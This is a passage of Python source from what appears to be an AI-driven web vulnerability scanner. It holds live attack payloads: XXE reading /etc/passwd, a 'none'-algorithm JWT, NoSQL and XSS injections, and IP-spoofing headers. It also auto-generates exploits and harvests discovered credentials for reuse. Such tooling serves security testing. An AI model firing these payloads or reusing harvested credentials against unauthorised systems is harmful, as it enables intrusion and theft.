                ranked = self.param_analyzer.rank_parameters(param_dict)
                param_info = []
                for name, score, vulns in ranked[:5]:
                    param_info.append(f"  {name}: risk={score:.1f}, likely_vulns={vulns[:3]}")
                if param_info:
                    parts.append(f"\nPARAMETER RISK ANALYSIS:")
                    parts.extend(param_info)
            except Exception:
                pass

        # Memory: what was already tested
        tested_payloads = []
        for p in params[:3]:
            if self.memory.was_tested(url, p, vuln_type) or self.memory.was_tested(base_url, p, vuln_type):
                tested_payloads.append(f"  {p}: already tested (skip)")
        if tested_payloads:
            parts.append(f"\nPREVIOUSLY TESTED (from memory):")
            parts.extend(tested_payloads)

        # RAG context
        if self.rag_engine:
            try:
                rag_ctx = self._get_rag_testing_context(vuln_type, url)
                if rag_ctx:
                    parts.append(f"\nRAG CONTEXT (historical patterns):")
                    parts.append(rag_ctx[:500])
            except Exception:
                pass

        return "\n".join(parts)

    async def _execute_ai_planned_tests(
        self, tests: List[Dict], default_url: str, default_method: str
    ) -> List[Dict]:
        """Execute AI-planned test cases, return results with full responses.

        Reuses _make_request() and _make_request_with_injection() for HTTP calls.
        """
        results = []

        for test in tests[:5]:
            if self.is_cancelled():
                break

            test_url = test.get("url", default_url)
            test_method = test.get("method", default_method).upper()
            test_params = test.get("params", {})
            test_headers = test.get("headers", {})
            test_body = test.get("body", "")
            test_name = test.get("name", "unnamed")
            injection_point = test.get("injection_point", "parameter")
            content_type = test.get("content_type", "")

            try:
                start_time = asyncio.get_event_loop().time()

                if injection_point == "header" and test_headers:
                    # Use header injection for header-based tests
                    header_name = list(test_headers.keys())[0] if test_headers else "X-Test"
                    payload = test_headers.get(header_name, "")
                    resp = await self._make_request_with_injection(
                        test_url, test_method, payload,
                        injection_point="header", header_name=header_name
                    )
                elif injection_point == "body" and test_body:
                    # Body injection
                    resp = await self._make_request_with_injection(
                        test_url, "POST", test_body,
                        injection_point="body", param_name="data"
                    )
                elif test_params:
                    # Parameter injection (default)
                    resp = await self._make_request(test_url, test_method, test_params)
                else:
                    # Plain request
                    resp = await self._make_request(test_url, test_method, {})

                elapsed = asyncio.get_event_loop().time() - start_time

                if resp:
                    # Extract the payload used for finding creation
                    payload_used = ""
                    param_used = ""
                    if test_params:
                        for k, v in test_params.items():
                            if v and len(str(v)) > 3:
                                payload_used = str(v)
                                param_used = k
                                break

                    result = {
                        "test_name": test_name,
                        "name": test_name,
                        "url": test_url,
                        "method": test_method,
                        "status": resp.get("status", 0),
                        "headers": {k: v for k, v in list(resp.get("headers", {}).items())[:15]},
                        "body_preview": resp.get("body", "")[:1500],
                        "body_length": len(resp.get("body", "")),
                        "response_time": round(elapsed, 3),
                        "payload": payload_used,
                        "param": param_used,
                    }
                    results.append(result)
                else:
                    results.append({
                        "test_name": test_name,
                        "name": test_name,
                        "url": test_url,
                        "method": test_method,
                        "status": 0,
                        "error": "No response",
                        "body_preview": "",
                        "body_length": 0,
                    })

            except Exception as e:
                results.append({
                    "test_name": test_name,
                    "name": test_name,
                    "url": test_url,
                    "error": str(e),
                    "status": 0,
                    "body_preview": "",
                    "body_length": 0,
                })

        return results

    async def _ai_test_fallback(self, user_prompt: str):
        """Fallback testing when LLM is not available - uses keyword detection"""
        await self.log("info", f"  Running fallback tests for: {user_prompt}")
        prompt_lower = user_prompt.lower()

        # Define fallback test mappings
        fallback_tests = {
            "xxe": self._test_xxe_fallback,
            "xml": self._test_xxe_fallback,
            "race": self._test_race_condition_fallback,
            "rate": self._test_rate_limit_fallback,
            "bola": self._test_idor_fallback,
            "idor": self._test_idor_fallback,
            "bfla": self._test_bfla_fallback,
            "jwt": self._test_jwt_fallback,
            "graphql": self._test_graphql_fallback,
            "nosql": self._test_nosql_fallback,
            "waf": self._test_waf_bypass_fallback,
            "csp": self._test_csp_bypass_fallback,
        }

        tests_run = False
        for keyword, test_func in fallback_tests.items():
            if keyword in prompt_lower:
                await test_func()
                tests_run = True

        if not tests_run:
            await self.log("warning", "  No fallback test matched. LLM required for this test type.")

    async def _test_xxe_fallback(self):
        """Test for XXE without LLM"""
        await self.log("info", "  Testing XXE (XML External Entity)...")

        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:80">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo></foo>',
        ]

        for endpoint in [self.target] + [_get_endpoint_url(ep) for ep in self.recon.endpoints[:5]]:
            if not endpoint:
                continue
            for payload in xxe_payloads:
                try:
                    headers = {"Content-Type": "application/xml"}
                    async with self.session.post(endpoint, data=payload, headers=headers) as resp:
                        body = await resp.text()
                        if "root:" in body or "daemon:" in body or "ENTITY" in body.lower():
                            finding = Finding(
                                id=hashlib.md5(f"xxe{endpoint}".encode()).hexdigest()[:8],
                                title="XXE (XML External Entity) Injection",
                                severity="critical",
                                vulnerability_type="xxe",
                                cvss_score=9.1,
                                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                                cwe_id="CWE-611",
                                description="XML External Entity injection allows reading local files and potentially SSRF.",
                                affected_endpoint=endpoint,
                                payload=payload[:200],
                                evidence=body[:500],
                                remediation="Disable external entity processing in XML parsers. Use JSON instead of XML where possible.",
                                ai_verified=False
                            )
                            await self._add_finding(finding)
                            await self.log("warning", f"  [FOUND] XXE at {endpoint[:50]}")
                            return
                except:
                    pass

    async def _test_race_condition_fallback(self):
        """Test for race conditions without LLM"""
        await self.log("info", "  Testing Race Conditions...")

        # Find form endpoints that might be vulnerable
        target_endpoints = []
        for form in self.recon.forms[:3]:
            if isinstance(form, dict):
                action = form.get("action", "")
                if action:
                    target_endpoints.append(action)

        if not target_endpoints:
            target_endpoints = [_get_endpoint_url(ep) for ep in self.recon.endpoints[:3] if _get_endpoint_url(ep)]

        for endpoint in target_endpoints:
            try:
                # Send multiple concurrent requests
                tasks = []
                for _ in range(10):
                    tasks.append(self.session.get(endpoint))

                responses = await asyncio.gather(*[task.__aenter__() for task in tasks], return_exceptions=True)

                # Check for inconsistent responses (potential race condition indicator)
                statuses = [r.status for r in responses if hasattr(r, 'status')]
                if len(set(statuses)) > 1:
                    await self.log("info", f"  Inconsistent responses detected at {endpoint[:50]} - potential race condition")

            except:
                pass

    async def _test_rate_limit_fallback(self):
        """Test for rate limiting bypass without LLM"""
        await self.log("info", "  Testing Rate Limiting...")

        headers_to_try = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"True-Client-IP": "127.0.0.1"},
        ]

        for endpoint in [self.target]:
            for headers in headers_to_try:
                try:
                    # Send many requests
                    for i in range(20):
                        headers["X-Forwarded-For"] = f"192.168.1.{i}"
                        async with self.session.get(endpoint, headers=headers) as resp:
                            if resp.status == 429:
                                await self.log("info", f"  Rate limit hit at request {i}")
                                break
                            if i == 19:
                                await self.log("warning", f"  [POTENTIAL] No rate limiting detected with header bypass")
                except:
                    pass

    async def _test_idor_fallback(self):
        """Test for IDOR/BOLA without LLM"""
        await self.log("info", "  Testing IDOR/BOLA...")

        # Find endpoints with numeric parameters
        for param, endpoints in self.recon.parameters.items():
            for endpoint in endpoints[:2]:
                url = _get_endpoint_url(endpoint) if isinstance(endpoint, dict) else endpoint
                if not url:
                    continue

                # Try changing IDs
                for test_id in ["1", "2", "0", "-1", "9999999"]:
                    try:
                        parsed = urlparse(url)
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{param}={test_id}"
                        async with self.session.get(test_url) as resp:
                            if resp.status == 200:
                                body = await resp.text()
                                if len(body) > 100:
                                    await self.log("debug", f"  Got response for {param}={test_id}")
                    except:
                        pass

    async def _test_bfla_fallback(self):
        """Test for BFLA without LLM"""
        await self.log("info", "  Testing BFLA (Broken Function Level Authorization)...")

        admin_paths = ["/admin", "/api/admin", "/api/v1/admin", "/manage", "/dashboard", "/internal"]

        for path in admin_paths:
            try:
                url = urljoin(self.target, path)
                async with self.session.get(url) as resp:
                    if resp.status == 200:
                        await self.log("warning", f"  [POTENTIAL] Admin endpoint accessible: {url}")
                    elif resp.status in [401, 403]:
                        await self.log("debug", f"  Protected: {url}")
            except:
                pass

    async def _test_jwt_fallback(self):
        """Test for JWT vulnerabilities without LLM"""
        await self.log("info", "  Testing JWT vulnerabilities...")

        # Try none algorithm and other JWT attacks
        jwt_tests = [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.test",
        ]

        for endpoint in [self.target] + [_get_endpoint_url(ep) for ep in self.recon.endpoints[:3]]:
            if not endpoint:
                continue
            for jwt in jwt_tests:
                try:
                    headers = {"Authorization": f"Bearer {jwt}"}
                    async with self.session.get(endpoint, headers=headers) as resp:
                        if resp.status == 200:
                            await self.log("debug", f"  JWT accepted at {endpoint[:50]}")
                except:
                    pass

    async def _test_graphql_fallback(self):
        """Test for GraphQL vulnerabilities without LLM"""
        await self.log("info", "  Testing GraphQL...")

        graphql_endpoints = ["/graphql", "/api/graphql", "/v1/graphql", "/query"]
        introspection_query = '{"query": "{ __schema { types { name } } }"}'

        for path in graphql_endpoints:
            try:
                url = urljoin(self.target, path)
                headers = {"Content-Type": "application/json"}
                async with self.session.post(url, data=introspection_query, headers=headers) as resp:
                    if resp.status == 200:
                        body = await resp.text()
                        if "__schema" in body or "types" in body:
                            finding = Finding(
                                id=hashlib.md5(f"graphql{url}".encode()).hexdigest()[:8],
                                title="GraphQL Introspection Enabled",
                                severity="low",
                                vulnerability_type="graphql_introspection",
                                cvss_score=3.0,
                                cwe_id="CWE-200",
                                description="GraphQL introspection is enabled, exposing the entire API schema.",
                                affected_endpoint=url,
                                evidence=body[:500],
                                remediation="Disable introspection in production environments.",
                                ai_verified=False
                            )
                            await self._add_finding(finding)
                            await self.log("warning", f"  [FOUND] GraphQL introspection at {url}")
            except:
                pass

    async def _test_nosql_fallback(self):
        """Test for NoSQL injection without LLM"""
        await self.log("info", "  Testing NoSQL injection...")

        nosql_payloads = [
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$where": "1==1"}',
            "[$gt]=&",
            '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
        ]

        for param, endpoints in list(self.recon.parameters.items())[:5]:
            for endpoint in endpoints[:2]:
                url = _get_endpoint_url(endpoint) if isinstance(endpoint, dict) else endpoint
                if not url:
                    continue
                for payload in nosql_payloads:
                    try:
                        test_url = f"{url.split('?')[0]}?{param}={payload}"
                        async with self.session.get(test_url) as resp:
                            body = await resp.text()
                            if resp.status == 200 and len(body) > 100:
                                await self.log("debug", f"  NoSQL payload accepted: {param}={payload[:30]}")
                    except:
                        pass

    async def _test_waf_bypass_fallback(self):
        """Test for WAF bypass without LLM"""
        await self.log("info", "  Testing WAF bypass techniques...")

        bypass_payloads = [
            "<script>alert(1)</script>",  # Original
            "<scr<script>ipt>alert(1)</script>",  # Nested
            "<img src=x onerror=alert(1)>",  # Event handler
            "<<script>script>alert(1)<</script>/script>",  # Double encoding
            "%3Cscript%3Ealert(1)%3C/script%3E",  # URL encoded
        ]

        for endpoint in [self.target]:
            for payload in bypass_payloads:
                try:
                    test_url = f"{endpoint}?test={payload}"
                    async with self.session.get(test_url) as resp:
                        if resp.status == 403:
                            await self.log("debug", f"  WAF blocked: {payload[:30]}")
                        elif resp.status == 200:
                            body = await resp.text()
                            if payload in body or "alert(1)" in body:
                                await self.log("warning", f"  [POTENTIAL] WAF bypass: {payload[:30]}")
                except:
                    pass

    async def _test_csp_bypass_fallback(self):
        """Test for CSP bypass without LLM"""
        await self.log("info", "  Testing CSP bypass...")

        try:
            async with self.session.get(self.target) as resp:
                csp = resp.headers.get("Content-Security-Policy", "")

                if not csp:
                    await self.log("warning", "  No CSP header found")
                    return

                # Check for weak CSP
                weaknesses = []
                if "unsafe-inline" in csp:
                    weaknesses.append("unsafe-inline allows inline scripts")
                if "unsafe-eval" in csp:
                    weaknesses.append("unsafe-eval allows eval()")
                if "*" in csp:
                    weaknesses.append("Wildcard (*) in CSP is too permissive")
                if "data:" in csp:
                    weaknesses.append("data: URI scheme can be abused")

                if weaknesses:
                    finding = Finding(
                        id=hashlib.md5(f"csp{self.target}".encode()).hexdigest()[:8],
                        title="Weak Content Security Policy",
                        severity="medium",
                        vulnerability_type="csp_bypass",
                        cvss_score=4.0,
                        cwe_id="CWE-693",
                        description=f"CSP has weaknesses: {'; '.join(weaknesses)}",
                        affected_endpoint=self.target,
                        evidence=f"CSP: {csp[:500]}",
                        remediation="Remove unsafe-inline, unsafe-eval, wildcards, and data: from CSP.",
                        ai_verified=False
                    )
                    await self._add_finding(finding)
                    await self.log("warning", f"  [FOUND] Weak CSP: {', '.join(weaknesses)}")
        except:
            pass

    async def _ai_test_vulnerability(self, vuln_type: str):
        """Wrapper for backwards compatibility - now uses AI dynamic test"""
        await self._ai_dynamic_test(vuln_type)

    async def _execute_ai_test(self, test: Dict, vuln_type: str):
        """Execute an AI-generated test"""
        if not self.session:
            return

        try:
            url = test.get("url", self.target)
            method = test.get("method", "GET").upper()
            headers = test.get("headers", {})
            params = test.get("params", {})
            check = test.get("check", "")

            if method == "GET":
                async with self.session.get(url, params=params, headers=headers) as resp:
                    body = await resp.text()
                    response_headers = dict(resp.headers)
            else:
                async with self.session.post(url, data=params, headers=headers) as resp:
                    body = await resp.text()
                    response_headers = dict(resp.headers)

            # Use AI to analyze if vulnerability exists
            if self.llm.is_available() and check:
                # RAG: Get reasoning context for better AI analysis
                rag_testing_ctx = self._get_rag_testing_context(vuln_type, url) if (self.rag_engine or self.few_shot_selector) else ""

                # Playbook methodology context for this vuln type
                pb_ctx = getattr(self, '_current_playbook_context', '') or ''

                analysis_prompt = f"""Analyze this response for {vuln_type} vulnerability.
Check for: {check}

Response status: {resp.status}
Response headers: {dict(list(response_headers.items())[:10])}
Response body (first 1000 chars): {body[:1000]}
{rag_testing_ctx}{pb_ctx}

Is this vulnerable? Respond with:
VULNERABLE: <evidence>
or
NOT_VULNERABLE: <reason>"""

                result = await self.llm.generate(analysis_prompt, self._get_enhanced_system_prompt("verification"))
                if "VULNERABLE:" in result.upper():
                    evidence = result.split(":", 1)[1].strip() if ":" in result else result

                    # Anti-hallucination: verify AI evidence in actual response
                    if not self._evidence_in_response(evidence, body):
                        await self.log("debug", f"  [REJECTED] AI evidence not grounded in response for {vuln_type}")
                        return

                    mapped = self._map_vuln_type(vuln_type)
                    finding = Finding(
                        id=hashlib.md5(f"{vuln_type}{url}ai".encode()).hexdigest()[:8],
                        title=self.vuln_registry.get_title(mapped) or f"AI-Detected {vuln_type.title()} Vulnerability",
                        severity=self._get_severity(vuln_type),
                        vulnerability_type=vuln_type,
                        cvss_score=self._get_cvss_score(vuln_type),
                        cvss_vector=self._get_cvss_vector(vuln_type),
                        cwe_id=self.vuln_registry.get_cwe_id(mapped) or "",
                        description=self.vuln_registry.get_description(mapped) or f"AI analysis detected potential {vuln_type} vulnerability.",
                        affected_endpoint=url,
                        evidence=evidence[:500],
                        remediation=self.vuln_registry.get_remediation(mapped) or f"Review and remediate the {vuln_type} vulnerability.",
                        ai_verified=True
                    )
                    await self._add_finding(finding)
                    await self.log("warning", f"  [AI FOUND] {vuln_type} at {url[:50]}")

        except Exception as e:
            await self.log("debug", f"  AI test execution error: {e}")

    async def _test_single_param(self, base_url: str, param: str, payload: str, vuln_type: str):
        """Test a single parameter with a payload"""
        if not self.session:
            return

        try:
            # Build test URL
            parsed = urlparse(base_url)
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            test_url = f"{base}?{param}={payload}"

            async with self.session.get(test_url) as resp:
                body = await resp.text()
                response_data = {
                    "status": resp.status,
                    "body": body,
                    "headers": dict(resp.headers),
                    "url": str(resp.url),
                    "method": "GET",
                    "content_type": resp.headers.get("Content-Type", "")
                }

                is_vuln, evidence = await self._verify_vulnerability(vuln_type, payload, response_data)
                if is_vuln:
                    await self.log("warning", f"    [POTENTIAL] {vuln_type.upper()} found in {param}")
                    # Run through ValidationJudge pipeline
                    finding = await self._judge_finding(
                        vuln_type, test_url, param, payload, evidence, response_data
                    )
                    if finding:
                        await self._add_finding(finding)

        except Exception as e:
            await self.log("debug", f"    Test error: {e}")

    async def log_script(self, level: str, message: str):
        """Log a script/tool message"""
        await self.log(level, message)

    async def log_llm(self, level: str, message: str):
        """Log an LLM/AI message - prefixed with [AI] or [LLM]"""
        if not message.startswith('[AI]') and not message.startswith('[LLM]'):
            message = f"[AI] {message}"
        await self.log(level, message)

    async def _add_finding(self, finding: Finding):
        """Add a finding through memory (dedup + bounded + evidence check)"""
        added = self.memory.add_finding(finding)
        if not added:
            reason = "duplicate" if self.memory.has_finding_for(
                finding.vulnerability_type, finding.affected_endpoint, finding.parameter
            ) else "rejected by memory (missing evidence, speculative, or at capacity)"
            await self.log("info", f"    [SKIP] {finding.title} - {reason}")
            return

        await self.log("warning", f"    [FOUND] {finding.title} - {finding.severity}")

        # AI exploitation validation
        try:
            validation = await self._ai_validate_exploitation(asdict(finding))
            if validation:
                if validation.get("false_positive_risk") in ("medium", "high"):
                    await self.log("warning", f"    [AI] False positive risk: {validation['false_positive_risk']} for {finding.title}")
                if validation.get("exploitation_notes"):
                    finding.evidence = f"{finding.evidence or ''} | [AI Validation] {validation['exploitation_notes']}"
                    await self.log("info", f"    [AI] Exploitation notes: {validation['exploitation_notes'][:100]}")
        except Exception:
            pass

        # Generate PoC code — prefer exploit_generator (AI-enhanced), fallback to poc_generator
        if not finding.poc_code:
            poc_generated = False
            if self.exploit_generator and self.llm.is_available():
                try:
                    exploit_result = await self.exploit_generator.generate(
                        finding, self.recon, self.llm, self.token_budget,
                        waf_detected=bool(self._waf_result and self._waf_result.detected_wafs),
                    )
                    if exploit_result and getattr(exploit_result, "poc_code", ""):
                        finding.poc_code = exploit_result.poc_code
                        poc_generated = True
                except Exception:
                    pass
            if not poc_generated:
                try:
                    finding.poc_code = self.poc_generator.generate(
                        finding.vulnerability_type,
                        finding.affected_endpoint,
                        finding.parameter,
                        finding.payload,
                        finding.evidence,
                        method=finding.request.split()[0] if finding.request else "GET"
                    )
                except Exception:
                    pass

        # Validate the generated PoC by replaying it
        if finding.poc_code and self.poc_validator_engine:
            try:
                validation = await self.poc_validator_engine.validate(
                    finding.poc_code, finding, self.request_engine
                )
                if validation and hasattr(validation, "valid"):
                    if not validation.valid:
                        await self.log("debug", f"    [POC] Validation failed: {validation.actual_result}")
            except Exception:
                pass

        # Record success in execution history for cross-scan learning
        if self.execution_history:
            try:
                self.execution_history.record(
                    self.recon.technologies,
                    finding.vulnerability_type,
                    finding.affected_endpoint,
                    True,
                    finding.evidence or ""
                )
            except Exception:
                pass

        # RAG: Record reasoning trace for future retrieval (pseudo-fine-tuning)
        if self.reasoning_memory and HAS_RAG:
            try:
                trace = ReasoningTrace(
                    vuln_type=finding.vulnerability_type,
                    technology=", ".join(self.recon.technologies[:3]) if self.recon.technologies else "unknown",
                    endpoint_pattern=self._normalize_endpoint_for_rag(finding.affected_endpoint),
                    parameter=finding.parameter or "",
                    reasoning_steps=[
                        f"Tested {finding.vulnerability_type} on {finding.affected_endpoint}",
                        f"Parameter: {finding.parameter or 'N/A'}",
                        f"Payload: {finding.payload or 'N/A'}",
                        f"Evidence: {(finding.evidence or '')[:200]}",
                        f"Confidence: {getattr(finding, 'confidence_score', 'N/A')}",
                    ],
                    payload_used=finding.payload or "",
                    evidence_summary=(finding.evidence or "")[:300],
                    confidence=getattr(finding, 'confidence_score', 80) / 100.0,
                    scan_target=self.target
                )
                self.reasoning_memory.record_success(trace)
                # Also index in RAG engine for semantic retrieval
                if self.rag_engine:
                    self.rag_engine.index_reasoning_trace(asdict(trace))
            except Exception:
                pass

        # Capture screenshot for the confirmed finding
        await self._capture_finding_screenshot(finding)

        # Chain engine: derive new targets from this finding
        if self.chain_engine:
            try:
                derived = await self.chain_engine.on_finding(finding, self.recon, self.memory)
                if derived:
                    await self.log("info", f"    [CHAIN] {len(derived)} derived targets from {finding.vulnerability_type}")
                    for chain_target in derived[:5]:  # Limit to 5 derived targets per finding
                        await self.log("info", f"    [CHAIN] Testing {chain_target.vuln_type} → {chain_target.url[:50]}")
                        try:
                            chain_finding = await self._test_vulnerability_type(
                                chain_target.url,
                                chain_target.vuln_type,
                                "GET",
                                [chain_target.param] if chain_target.param else ["id"]
                            )
                            if chain_finding:
                                chain_finding.evidence = f"{chain_finding.evidence or ''} [CHAIN from {finding.id}: {finding.vulnerability_type}]"
                                await self._add_finding(chain_finding)
                        except Exception as e:
                            await self.log("debug", f"    [CHAIN] Test failed: {e}")
            except Exception as e:
                await self.log("debug", f"    [CHAIN] Engine error: {e}")

        # Strategy propagation: generate related test tasks from finding patterns
        if self.strategy:
            try:
                propagated = self.strategy.propagate_finding_pattern(
                    finding, self.recon.endpoints
                )
                if propagated:
                    await self.log("info", f"    [STRATEGY] Propagated {len(propagated)} "
                                   f"related test targets from {finding.vulnerability_type}")
                    # Queue propagated targets into endpoint queue if available
                    if hasattr(self, '_endpoint_queue'):
                        for task in propagated[:10]:
                            await self._endpoint_queue.put({"url": task["url"]})
            except Exception as e:
                await self.log("debug", f"    [STRATEGY] Propagation error: {e}")

        # Reasoning engine: reflect on confirmed finding for strategy adaptation
        if self.reasoning_engine:
            try:
                reflection = await self.reasoning_engine.reflect(
                    action_taken=f"confirmed_{finding.vulnerability_type}",
                    result_observed={
                        "endpoint": finding.affected_endpoint,
                        "param": finding.parameter or "",
                        "severity": finding.severity,
                        "vuln_type": finding.vulnerability_type,
                    }
                )
                if reflection and reflection.learned_pattern:
                    await self.log("info", f"    [REASONING] Learned: {reflection.learned_pattern}")
            except Exception:
                pass

        # Feed discovered credentials to auth manager
        if self.auth_manager and finding.vulnerability_type in (
            "information_disclosure", "api_key_exposure", "default_credentials",
            "weak_password", "hardcoded_secrets"
        ):
            try:
                cred_pattern = re.findall(
                    r'(?:password|passwd|pwd|pass|api_key|apikey|token|secret)[=:"\s]+([^\s"\'&,;]{4,})',
                    finding.evidence or "", re.IGNORECASE
                )
                for cred_val in cred_pattern[:3]:
                    self.auth_manager.add_credentials(
                        username="discovered", password=cred_val,
                        role="user", source="discovered"
                    )
                    await self.log("info", f"    [AUTH] Discovered credential fed to auth manager")
            except Exception:
                pass

        if self.finding_callback:
            try:
                await self.finding_callback(asdict(finding))
            except Exception as e:
                print(f"Finding callback error: {e}")

    async def _double_check_findings(self):
        """Re-validate all confirmed findings by re-sending payloads.

        Uses a different validation approach than the original test:
        - Re-sends the exact payload and verifies the response
        - Compares with a benign request (negative control)
        - Downgrades findings that fail re-validation
        """
        if not self.findings:
            return

        await self.log("info", f"  Double-checking {len(self.findings)} findings...")
        demoted = 0

        for i, finding in enumerate(list(self.findings)):
            if self.is_cancelled():
                break

            endpoint = finding.affected_endpoint
            payload = finding.payload
            param = finding.parameter

            if not endpoint or not payload:
                finding.evidence = (finding.evidence or "") + " [DOUBLE-CHECK: skipped (no payload)]"
                continue

            try:
                # 1. Re-send the attack payload
                method = "GET"
                if finding.request:
                    parts = finding.request.split()
                    if parts:
                        method = parts[0].upper()

                attack_resp = await self._make_request(
                    endpoint, method=method,
                    params={param: payload} if method == "GET" and param else None,
                    data={param: payload} if method == "POST" and param else None,
                )

                # 2. Send benign value for comparison
                benign_resp = await self._make_request(
                    endpoint, method=method,
                    params={param: "test123"} if method == "GET" and param else None,
                    data={param: "test123"} if method == "POST" and param else None,
                )

                if not attack_resp:
                    finding.evidence = (finding.evidence or "") + " [DOUBLE-CHECK: no response]"
                    continue

                attack_status = attack_resp.get("status", 0)
                attack_body = attack_resp.get("body", "")
                benign_status = benign_resp.get("status", 0) if benign_resp else 0
                benign_body = benign_resp.get("body", "") if benign_resp else ""

                # Check if payload is still reflected/executed
                still_valid = False

                # Check payload reflection
                if payload in attack_body and payload not in benign_body:
                    still_valid = True

                # Check for vulnerability-specific markers
                vuln_type = finding.vulnerability_type
                if vuln_type in ("sqli_error", "sqli_union", "sqli_blind"):
                    sql_markers = ["sql", "syntax", "mysql", "postgresql", "sqlite", "oracle", "mssql"]
                    if any(m in attack_body.lower() for m in sql_markers):
                        still_valid = True
                elif vuln_type == "command_injection":
                    if any(m in attack_body for m in ["uid=", "root:", "www-data", "bin/"]):
                        still_valid = True
                elif vuln_type == "ssti":
                    # Check for evaluated expressions
                    if "49" in attack_body and "49" not in benign_body:
                        still_valid = True
                elif vuln_type in ("xss_reflected", "xss_stored"):
                    if "<script" in attack_body.lower() or "onerror" in attack_body.lower():
                        still_valid = True
                elif vuln_type == "lfi":
                    if "root:" in attack_body or "[boot loader]" in attack_body:
                        still_valid = True

                # Status code difference as weak signal
                if attack_status != benign_status and attack_status in (200, 500):
                    still_valid = True

                if still_valid:
                    finding.evidence = (finding.evidence or "") + " [DOUBLE-CHECK: CONFIRMED]"
                    finding.confidence_score = min(100, (finding.confidence_score or 0) + 10)
                    await self.log("info", f"    [DC] CONFIRMED: {finding.title}")
                else:
                    # Demote: move to rejected
                    finding.evidence = (finding.evidence or "") + " [DOUBLE-CHECK: FAILED]"
                    finding.ai_status = "rejected"
                    finding.rejection_reason = (finding.rejection_reason or "") + " Double-check re-validation failed."
                    finding.confidence_score = max(0, (finding.confidence_score or 0) - 30)
                    self.findings.remove(finding)
                    self.rejected_findings.append(finding)
                    demoted += 1
                    await self.log("warning", f"    [DC] DEMOTED: {finding.title}")

            except Exception as e:
                await self.log("debug", f"    [DC] Error checking {finding.title}: {e}")
                finding.evidence = (finding.evidence or "") + f" [DOUBLE-CHECK: error - {str(e)[:50]}]"

        await self.log("info", f"  Double-check complete: {demoted} findings demoted, "
                       f"{len(self.findings)} remain confirmed")

    async def _capture_finding_screenshot(self, finding: Finding):
        """Capture a browser screenshot for a confirmed vulnerability finding.

        Uses Playwright via BrowserValidator to navigate to the affected
        endpoint and take a full-page screenshot. Screenshots are stored in
        reports/screenshots/{scan_id}/{finding_id}/ when scan_id is available,
        or reports/screenshots/{finding_id}/ as fallback. Screenshots are also
        embedded as base64 in the finding's screenshots list for HTML reports.
        """
        if not HAS_PLAYWRIGHT or BrowserValidator is None:
            return

        url = finding.affected_endpoint
        if not url or not url.startswith(("http://", "https://")):
            return

        try:
            # Organize screenshots by scan_id subfolder
            if self.scan_id:
                screenshots_dir = f"reports/screenshots/{self.scan_id}"
            else:
                screenshots_dir = "reports/screenshots"
            validator = BrowserValidator(screenshots_dir=screenshots_dir)
            await validator.start(headless=True)
            try:
                result = await validator.validate_finding(
                    finding_id=finding.id,
                    url=url,
                    payload=finding.payload,
                    timeout=15000
                )
                # Embed screenshots as base64 data URIs
                for ss_path in result.get("screenshots", []):
                    data_uri = embed_screenshot(ss_path)
                    if data_uri:
                        finding.screenshots.append(data_uri)

                if finding.screenshots:
                    await self.log("info", f"    [SCREENSHOT] Captured {len(finding.screenshots)} screenshot(s) for {finding.id}")
            finally:
                await validator.stop()
        except Exception as e:
            await self.log("debug", f"    Screenshot capture failed for {finding.id}: {e}")

    def _normalize_target(self, target: str) -> str:
        """Ensure target has proper scheme"""
        if not target.startswith(('http://', 'https://')):
            return f"https://{target}"
        return target

    # ─── Methodology-enhanced system prompt wrapper ─────────────────────────
    METHODOLOGY_CHAR_BUDGETS = {
        "strategy": 3000, "playbook": 3000,
        "testing": 2000, "reporting": 2000,
        "confirmation": 1500, "verification": 1500, "poc_generation": 1500,
        "interpretation": 1000,
    }

    def _get_enhanced_system_prompt(
        self, context: str, vuln_type: Optional[str] = None,
    ) -> str:
        """Build system prompt with external methodology injection.

        Delegates to get_system_prompt/get_prompt_for_vuln_type for the base
        anti-hallucination prompts, then appends relevant methodology sections
        and DB-loaded custom prompts.
        """
        # Base system prompt (unchanged behavior)
        if vuln_type:
            base = get_prompt_for_vuln_type(vuln_type, context)
        else:
            base = get_system_prompt(context)

        # Methodology file injection (indexed by vuln_type + context)
        if self.methodology_index:
            budget = self.METHODOLOGY_CHAR_BUDGETS.get(context, 1500)
            methodology_ctx = self.methodology_index.get_for_vuln_and_context(
                vuln_type or "", context, max_chars=budget,
            )
            if methodology_ctx:
                base += f"\n\n## EXTERNAL METHODOLOGY GUIDANCE\n{methodology_ctx}"

        # DB-loaded custom prompts injection
        if self.loaded_custom_prompts:
            custom_ctx = ""
            if vuln_type:
                custom_ctx = self._get_custom_prompts_for_vuln_type(vuln_type)
            if not custom_ctx:
                custom_ctx = self._build_custom_prompt_context(context)
            if custom_ctx:
                base += custom_ctx[:1500]

        return base

    MAX_CUSTOM_CONTEXT_CHARS = 5000

    def _build_custom_prompt_context(self, stage: str = "general") -> str:
        """Build context string from loaded custom prompts for a given stage.

        Args:
            stage: One of 'strategy', 'testing', 'confirmation', 'reporting'
        """
        if not self.loaded_custom_prompts:
            return ""

        parts = ["\n## Custom Testing Instructions (User-Configured)"]
        total_chars = 0
        for p in self.loaded_custom_prompts:
            content = p.get("content", "")
            if total_chars + len(content) > self.MAX_CUSTOM_CONTEXT_CHARS:
                content = content[:self.MAX_CUSTOM_CONTEXT_CHARS - total_chars]
            parts.append(f"### {p.get('name', 'Custom Prompt')}")
            parts.append(content)
            total_chars += len(content)
